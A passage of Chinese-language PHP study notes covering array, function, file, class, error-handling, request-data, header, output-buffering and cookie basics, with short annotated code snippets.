class="line"><span class="title function_ invoke__">in_array</span>(<span class="variable">$str</span>,<span class="variable">$arr</span>,type);</span><br><span class="line"><span class="comment">// 搜某个value，返回key</span></span><br><span class="line"><span class="title function_ invoke__">array_search</span>(<span class="variable">$str</span>,<span class="variable">$arr</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 去重</span></span><br><span class="line"><span class="title function_ invoke__">array_unique</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取一个数组的所有下标，返回一个索引数组</span></span><br><span class="line"><span class="title function_ invoke__">array_keys</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// 获取一个数组的所有值，返回一个索引数组</span></span><br><span class="line"><span class="title function_ invoke__">array_values</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure><h3 id="12-函数"><a href="#12-函数" class="headerlink" title="12 函数"></a>12 函数</h3><h4 id="12-1-自定义函数"><a href="#12-1-自定义函数" class="headerlink" title="12.1 自定义函数"></a>12.1 自定义函数</h4><blockquote><p>同C++：默认值。</p><p>不同C：函数定义可以放在函数执行之后，因为他会先编译再执行，编译时代码段已经有了函数。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数中使用全局变量（不存在会直接生成）</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="comment">//可以有闭包，匿名函数。（use是将外部变量保留传递给内部用）</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p><strong>系统函数</strong></p><h4 id="12-2-输出"><a href="#12-2-输出" class="headerlink" title="12.2 输出"></a>12.2 输出</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输出，本质是结构不是函数，返回1，可以不用括号。</span></span><br><span class="line"><span class="keyword">print</span>();</span><br><span class="line"><span class="comment">// 只输出值。</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>();</span><br><span class="line"><span class="comment">// 输出值和类型。</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br></pre></td></tr></table></figure><h4 id="12-3-时间"><a href="#12-3-时间" class="headerlink" title="12.3 时间"></a>12.3 时间</h4><blockquote><p><a href="https://www.runoob.com/php/php-date.html">date()</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 日期（参数一填格式化输出, y m d h i s分别表示年月日时分秒，后一个表示时间戳，默认当前）</span></span><br><span class="line"><span class="title function_ invoke__">date</span>(format,[<span class="title function_ invoke__">time</span>()]);</span><br><span class="line"><span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="number">1462686882</span>);</span><br><span class="line"><span class="comment">// 时间戳</span></span><br><span class="line"><span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="comment">// 时间戳，微秒级</span></span><br><span class="line"><span class="title function_ invoke__">microtime</span>();</span><br><span class="line"><span class="comment">// 正确的输入的英文格式都能转化成时间戳</span></span><br><span class="line"><span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;str&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="12-4-数学"><a href="#12-4-数学" class="headerlink" title="12.4 数学"></a>12.4 数学</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">max</span>();</span><br><span class="line"><span class="title function_ invoke__">min</span>();</span><br><span class="line"><span class="title function_ invoke__">pow</span>();</span><br><span class="line"><span class="title function_ invoke__">abs</span>();</span><br><span class="line"><span class="title function_ invoke__">sqrt</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定区间的随机整数</span></span><br><span class="line"><span class="title function_ invoke__">rand</span>([min],max);</span><br><span class="line"><span class="comment">// 同rand()，效率比rand()高</span></span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="comment">// 四舍五入</span></span><br><span class="line"><span class="title function_ invoke__">round</span>();</span><br><span class="line"><span class="comment">// 上取整</span></span><br><span class="line"><span class="title function_ invoke__">ceil</span>();</span><br><span class="line"><span class="comment">// 下取整</span></span><br><span class="line"><span class="title function_ invoke__">floor</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转化 整形/浮点/字符串</span></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="variable">$var</span>);</span><br><span class="line"><span class="title function_ invoke__">floatval</span>(<span class="variable">$var</span>);</span><br><span class="line"><span class="title function_ invoke__">strval</span>(<span class="variable">$var</span>);</span><br></pre></td></tr></table></figure><h4 id="12-5-函数参数"><a href="#12-5-函数参数" class="headerlink" title="12.5 函数参数"></a>12.5 函数参数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检测函数名字是否存在</span></span><br><span class="line"><span class="title function_ invoke__">function_exists</span>(func);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数内使用</span></span><br><span class="line"><span class="comment">// 获得函数第 num 个参数</span></span><br><span class="line"><span class="title function_ invoke__">func_get_arg</span>( num );</span><br><span class="line"><span class="comment">// 获得函数全部参数</span></span><br><span class="line"><span class="title function_ invoke__">func_get_args</span>();</span><br><span class="line"><span class="comment">// 获得函数参数</span></span><br><span class="line"><span class="title function_ invoke__">func_num_args</span>();</span><br></pre></td></tr></table></figure><h4 id="12-6-检验函数"><a href="#12-6-检验函数" class="headerlink" title="12.6 检验函数"></a>12.6 检验函数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检验$var是否定义。已定义检测是否不为NULL</span></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$var</span>);</span><br><span class="line"><span class="comment">// 检测是否为空</span></span><br><span class="line"><span class="comment">// 1.未定义</span></span><br><span class="line"><span class="comment">// 2.值是否为0</span></span><br><span class="line"><span class="keyword">empty</span>(<span class="variable">$var</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否是*</span></span><br><span class="line">is_*();</span><br><span class="line"><span class="comment">// string/int/float/bool/null/array</span></span><br><span class="line"><span class="title function_ invoke__">is_int</span>();</span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(); <span class="comment">// 是否是数字</span></span><br></pre></td></tr></table></figure><h4 id="12-7-正则表达式"><a href="#12-7-正则表达式" class="headerlink" title="12.7 正则表达式"></a>12.7 正则表达式</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首个匹配则终止（$pattern=&quot;/ exp /&quot;：双斜杠中写表达式）</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="keyword">string</span> <span class="variable">$pattern</span>,obj);</span><br><span class="line"><span class="comment"># 匹配所有</span></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="keyword">string</span> <span class="variable">$pattern</span>,obj);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断输入的是数字</span></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/^\d+$/&quot;</span>,<span class="variable">$num</span>)</span><br></pre></td></tr></table></figure><h3 id="13-文件"><a href="#13-文件" class="headerlink" title="13 文件"></a>13 文件</h3><h4 id="13-1-文件读写"><a href="#13-1-文件读写" class="headerlink" title="13.1 文件读写"></a>13.1 文件读写</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 打开文件（方式rwax,+,b）（x是只写，w是写入）</span></span><br><span class="line"><span class="comment">// http只能只读，ftp只能只读或只写</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;https://www.baidu.com/&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;ftp://user:password@en.cn/exam.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;/home/file.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭文件</span></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件</span></span><br><span class="line"><span class="comment">// 读取整个文件，指定长度</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">fread</span>(resource handle,<span class="keyword">int</span> length);</span><br><span class="line"><span class="comment">// 一行字符，读到回车或length-1就返回</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">fgets</span>(resource handle[,<span class="keyword">int</span> length]);</span><br><span class="line"><span class="comment">// 一行字符并去掉所有html和php标记</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">fgetss</span>(resource handle[,<span class="keyword">int</span> length]);</span><br><span class="line"><span class="comment">// 一个字符</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">fgetc</span>(resource handle);</span><br><span class="line"><span class="comment">// 无需开关文件就可读</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">file_get_contents</span>(resource handle);</span><br><span class="line"><span class="comment">// 文件读入数组，每个元素对应一行</span></span><br><span class="line"><span class="keyword">array</span> <span class="title function_ invoke__">file</span>(resource handle);</span><br><span class="line"><span class="comment">// 读到缓冲，返回读取字符数</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">readfile</span>(resource handle);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件指针操作</span></span><br><span class="line"><span class="comment">// 移动到开头</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">rewind</span>(resource handle);</span><br><span class="line"><span class="comment">// 返回当前位置</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">ftell</span>(resource handle);</span><br><span class="line"><span class="comment">// 移动到指定位置（移动偏移量，未指定起始位置默认从文件开头开始）</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">fseek</span>(resource handle,<span class="keyword">int</span> offset[,<span class="keyword">int</span> origin]);</span><br><span class="line"><span class="comment">// origin取值：SEEK_SET(0):文件开头，SEEK_CUR(1):当前位置，SEEK_END(2)：文件末尾</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入文件</span></span><br><span class="line"><span class="comment">// 写入字符串（设置了长度会只写入length个字符）</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">fwrite</span>(resource handle,stirng stirng[,<span class="keyword">int</span> length]);</span><br><span class="line"><span class="comment">// 无需开文件就可以写（mode指定方式，FILE_APPEND:追加）</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">string</span> filename,<span class="keyword">string</span> data[,<span class="keyword">int</span> mode]);</span><br></pre></td></tr></table></figure><h4 id="13-2-文件操作"><a href="#13-2-文件操作" class="headerlink" title="13.2 文件操作"></a>13.2 文件操作</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件操作</span></span><br><span class="line"><span class="comment">// 复制</span></span><br><span class="line"><span class="title function_ invoke__">copy</span>(src,dest);</span><br><span class="line"><span class="comment">// 删除</span></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(dest);</span><br><span class="line"><span class="comment">// 重命名</span></span><br><span class="line"><span class="title function_ invoke__">rename</span>(old,<span class="keyword">new</span>);</span><br><span class="line"><span class="comment">// 文件截断</span></span><br><span class="line"><span class="title function_ invoke__">ftruncate</span>(src,length);</span><br><span class="line"><span class="comment">// 判断文件或文件夹存在</span></span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(dest);</span><br><span class="line"><span class="comment">// 判断路径存在且为文件</span></span><br><span class="line"><span class="title function_ invoke__">is_file</span>(name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件属性</span></span><br><span class="line"><span class="comment">// 文件大小</span></span><br><span class="line"><span class="variable">$fsize</span> = <span class="title function_ invoke__">filesize</span>(file);</span><br><span class="line"><span class="comment">// 文件类型</span></span><br><span class="line"><span class="title function_ invoke__">filetype</span>(file);</span><br><span class="line"><span class="comment">// 时间戳</span></span><br><span class="line"><span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,<span class="title function_ invoke__">filectime</span>(file));</span><br><span class="line"><span class="comment">// 修改时间</span></span><br><span class="line"><span class="title function_ invoke__">filemtime</span>(file);</span><br><span class="line"><span class="comment">// 访问时间</span></span><br><span class="line"><span class="title function_ invoke__">fileatime</span>(file);</span><br><span class="line"><span class="comment">// 物理路径</span></span><br><span class="line"><span class="title function_ invoke__">realpath</span>(file);</span><br><span class="line"><span class="comment">// 数组形式返回路径和文件名信息</span></span><br><span class="line"><span class="title function_ invoke__">pathinfo</span>(file);</span><br><span class="line"><span class="comment">// 相对当前文件的路径信息</span></span><br><span class="line"><span class="title function_ invoke__">dirname</span>(file);</span><br><span class="line"><span class="comment">// 文件名信息</span></span><br><span class="line"><span class="title function_ invoke__">basename</span>(file);</span><br><span class="line"><span class="comment">// 数组形式返回大部分属性值</span></span><br><span class="line"><span class="title function_ invoke__">stat</span>(file);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路径操作</span></span><br><span class="line"><span class="comment">// 新建目录</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(pathname);</span><br><span class="line"><span class="comment">// 删除目录</span></span><br><span class="line"><span class="title function_ invoke__">rmdir</span>(dirname);</span><br><span class="line"><span class="comment">// 取得当前文件所在目录</span></span><br><span class="line"><span class="title function_ invoke__">getcwd</span>(<span class="keyword">void</span>);</span><br><span class="line"><span class="comment">// 改变当前目录</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(dirname);</span><br><span class="line"><span class="comment">// 打开目录，返回目录指针</span></span><br><span class="line"><span class="title function_ invoke__">opendir</span>(path);</span><br><span class="line"><span class="comment">// 关闭目录，参数为目录指针</span></span><br><span class="line"><span class="title function_ invoke__">closedir</span>(*p);</span><br><span class="line"><span class="comment">// 遍历目录</span></span><br><span class="line"><span class="title function_ invoke__">readdir</span>();</span><br><span class="line"><span class="comment">// 数组形式遍历目录，sort设置为True或False</span></span><br><span class="line"><span class="title function_ invoke__">scandir</span>(path,sort);</span><br><span class="line"><span class="comment">// 目录指针重置回目录开头</span></span><br><span class="line"><span class="title function_ invoke__">rewinddir</span>(*p);</span><br></pre></td></tr></table></figure><h3 id="13-类与对象"><a href="#13-类与对象" class="headerlink" title="13 类与对象"></a>13 类与对象</h3><ul><li><p>基础</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大体同c++：private,public,$this-&gt;</span></span><br><span class="line"><span class="comment"># 定义类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">name</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="comment"># 析构函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化对象</span></span><br><span class="line"><span class="variable">$name</span> = <span class="keyword">new</span> <span class="title function_ invoke__">calss_name</span>();</span><br><span class="line"><span class="comment"># 访问对象</span></span><br><span class="line"><span class="variable">$name</span>-&gt;para;</span><br><span class="line"><span class="variable">$name</span>-&gt;<span class="title function_ invoke__">function_name</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 静态变量常量访问</span></span><br><span class="line"><span class="variable">$name</span>::<span class="title function_ invoke__">function_name</span>();</span><br><span class="line"><span class="comment"># 检测某个对象是否属于某个类</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span> <span class="keyword">instanceof</span> class_name;</span><br></pre></td></tr></table></figure></li><li><p>高级</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">name</span> <span class="keyword">extends</span> <span class="title">father</span></span>&#123;&#125;;</span><br><span class="line"><span class="comment"># 多态</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Students</span></span>&#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jk</span> <span class="keyword">extends</span> <span class="title">Students</span></span>&#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xxs</span> <span class="keyword">extends</span> <span class="title">Students</span></span>&#123;&#125;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="14-错误"><a href="#14-错误" class="headerlink" title="14 错误"></a>14 错误</h3><ul><li><p>错误代号</p><blockquote><p>所有看到的错误代码在PHP中都被定义成了系统常量。（可以直接使用）</p><p>所有以E开头的错误常量（代号）其实都是由一个字节存储，然后每一种错误占据一个对应的位，如果想进行一些错误的控制，可以使用位运算进行操作。</p><ol><li>系统错误：系统内置的错误。</li><li>用户错误：用户在使用自定义错误触发的时候，会使用到的错误代号。（系统不会用到）</li><li>其他错误</li></ol></blockquote></li></ul><div class="table-container"><table><thead><tr><th>系统错误</th><th>错误效果</th></tr></thead><tbody><tr><td>E_PARSE</td><td>编译错误，代码不会执行</td></tr><tr><td>E_ERROR</td><td>fatal error，致命错误，会导致代码不能正确继续执行（出错的位置断掉）</td></tr><tr><td>E_WARNING</td><td>warning，警告错误，不会影响代码执行，但是可能得到意想不到的结果</td></tr><tr><td>E_NOTICE</td><td>notice，通知错误，不会影响代码执行</td></tr><tr><td><strong>用户错误</strong></td><td><strong>错误效果</strong></td></tr><tr><td>E_USER_ERROR</td><td>fatal error</td></tr><tr><td>E_USER_WARNING</td><td>warning</td></tr><tr><td>E_USER_NOTICE</td><td>notice</td></tr><tr><td><strong>其他错误</strong></td><td><strong>错误效果</strong></td></tr><tr><td>E_ALL</td><td>代表着所有从错误（通常在进行错误控制的时候使用比较多），建议在开发过程中（开发环境）使用。</td></tr></tbody></table></div>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 排除通知级别notice</span></span><br><span class="line">E_ALL &amp; ~E_NOTICE</span><br><span class="line"></span><br><span class="line"><span class="comment">//只要警告和通知</span></span><br><span class="line">E_WARNING | E_NOTICE</span><br></pre></td></tr></table></figure><ul><li><p>抛出错误</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 抛出错误（&#x27;str&#x27;：错误提示，error：抛出错误类型（默认notice））</span></span><br><span class="line"><span class="title function_ invoke__">trigger_error</span>(<span class="string">&#x27;str&#x27;</span>,[error]);</span><br><span class="line"><span class="comment">// 设置错误（func：错误执行函数，error：触发错误）</span></span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(error_func,[error]);</span><br><span class="line"><span class="comment">// 错误函数（错误类型，错误提示，错误文件位置，错误行，错误文本）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error_func</span>(<span class="params"><span class="variable">$errno</span>,<span class="variable">$errstr</span>,[<span class="variable">$errfile</span>,<span class="variable">$errline</span>, <span class="variable">$errcontext</span>]</span>)</span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>( !( <span class="title function_ invoke__">error_reporting</span>() &amp; <span class="variable">$errno</span> )) <span class="comment">// 当前错误在系统中不存在，无法处理。</span></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><p>错误显示设置</p><blockquote><p>哪些错误该显示，以及该如何显示。</p><p>在PHP中，其实有两种方式来设置当前脚本的错误处理。</p></blockquote><ol><li><p>PHP的配置文件</p><ul><li>php.ini文件：全局配置。</li><li>Display_errors：是否显示错误。</li><li>Error_reporting：显示什么级别的错测。</li><li>error_log：错误日志路径。（log_errors：开启错误日志）</li></ul></li><li><p>可以在运行的PHP脚本中去设置（级别比配置文件高）</p><ul><li><p><code>Error_reporting()</code></p><blockquote><p>设置对应的错误显示级别。（没有参数表示当前错误级别）</p></blockquote></li><li><p><code>lniset(&#39;配置文件中的配置项&#39;,配置值);</code></p></li><li><code>lni_set(&#39;error..reporting&#39;,E_ALL);</code></li><li><code>lni_set(&#39;display_errors&#39;,1);</code></li></ul></li></ol></li></ul><h3 id="15-伪类型"><a href="#15-伪类型" class="headerlink" title="15 伪类型"></a>15 伪类型</h3><ul><li>实际不存在的类型，便于学习。<ul><li>Mixed：混合类型。</li><li>Number：数值类型。</li></ul></li></ul><hr><h2 id="三、PHP动态交互"><a href="#三、PHP动态交互" class="headerlink" title="三、PHP动态交互"></a>三、PHP动态交互</h2><h3 id="1-Web交互编程"><a href="#1-Web交互编程" class="headerlink" title="1 Web交互编程"></a>1 Web交互编程</h3><h4 id="1-1-收发数据"><a href="#1-1-收发数据" class="headerlink" title="1.1 收发数据"></a>1.1 收发数据</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获得post数据</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回当前执行脚本的文件名</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line"><span class="comment">// 返回访问页面使用的请求方法（例如 POST）</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="comment">// 返回当前执行脚本的文件名</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line"><span class="comment">// 返回浏览当前页面的用户的主机名</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_HOST&#x27;</span>];</span><br><span class="line"><span class="comment">// 返回访问者浏览器信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="comment">// 返回传递的cookie信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_COOKIE&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端与服务器握手IP，如果使用代理则会获取到代理IP</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="comment">// 代理服务器发送的HTTP头（可伪造）</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line"><span class="comment">// 用户是在哪个IP使用的代理（可伪造）</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得环境变量</span></span><br><span class="line"><span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="1-2-header"><a href="#1-2-header" class="headerlink" title="1.2 header()"></a>1.2 header()</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># header()是向浏览器传一个HTTP响应头信息</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">header</span>(stringmessage[, <span class="keyword">bool</span> replace[, <span class="keyword">int</span> http_response_code]])</span><br><span class="line"><span class="comment"># stringmessage格式：header_name:header_value</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="comment"># 1.重定向网页</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$url</span>=<span class="string">&#x27;http://web.3eol.com.cn&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:<span class="subst">$url</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.延迟转向</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">//3秒后，跳转到微博</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:3;url=http://weibo.com&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.设置中文</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.强制下载文件</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$filename</span>=<span class="string">&#x27;test.gif&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:image/gif&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition:attachment; filename=&quot;&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Length:&#x27;</span>.<span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-3-缓冲发送"><a href="#1-3-缓冲发送" class="headerlink" title="1.3 缓冲发送"></a>1.3 缓冲发送</h4><blockquote><p>没开启缓冲区时，程序执行输出的内容都是直接输出到浏览器的。</p><p>开启后，程序执行输出的内容会先存入缓冲区，之后再根据后续代码或脚本执行完成再发送给浏览器。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开输出缓冲区</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="comment"># 返回内部缓冲区的内容</span></span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="comment"># 返回内部缓冲区的内容，并关闭缓冲区</span></span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line"><span class="comment"># 返回内部缓冲区的内容，并关闭缓冲区，再把缓冲区内容立刻输出到客户端</span></span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">ob_get_flush</span>();</span><br><span class="line"><span class="comment"># 返回内部缓冲区的长度</span></span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">ob_get_length</span>();</span><br><span class="line"><span class="comment"># 删除内部缓冲区的内容，但不关闭缓冲区</span></span><br><span class="line"><span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line"><span class="comment"># 立刻输出内部缓冲区的内容，且不关闭缓冲区</span></span><br><span class="line"><span class="title function_ invoke__">ob_flush</span>();</span><br><span class="line"><span class="comment"># 刷新输出缓冲，将ob_flush输出的内容，以及不在PHP缓冲区的内容全部输出至浏览器</span></span><br><span class="line"><span class="title function_ invoke__">flush</span>();</span><br><span class="line"><span class="comment"># 删除内部缓冲区的内容，并关闭缓冲区</span></span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="comment"># 立刻输出内部缓冲区的内容，且不关闭缓冲区</span></span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br></pre></td></tr></table></figure><h3 id="2-获得缓存"><a href="#2-获得缓存" class="headerlink" title="2 获得缓存"></a>2 获得缓存</h3><h4 id="2-1-Cookie"><a href="#2-1-Cookie" class="headerlink" title="2.1 Cookie"></a>2.1 Cookie</h4><blockquote><p>cookie是小文本文件。</p><p>小是防止服务器写入巨大的垃圾信息给客户端。</p><p>文本文件是指文件不可执行，防止服务器写入恶意代码给客户端。</p><p><a href="https://www.cnblogs.com/forforever/p/12674056.html">获取来访者IP的方法</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置cookie(cookie名，cookie值，过期时间，有效目录，有效域名，是否HTTPS，是否只可http)</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(name, value, expire, path, domain，secure，httponly);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="title function_ invoke__">time</span>()+<span class="number">60</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="literal">false</span>，<span class="literal">false</span>)</span><br><span class="line"><span class="comment"># httponly设置为true，则意味着该cookie只能通过HTTP协议来访问，如果httponly设置为false或省略，则该cookie可以被客户端脚本访问，这样易被XSS攻击。</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 设置案例</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span 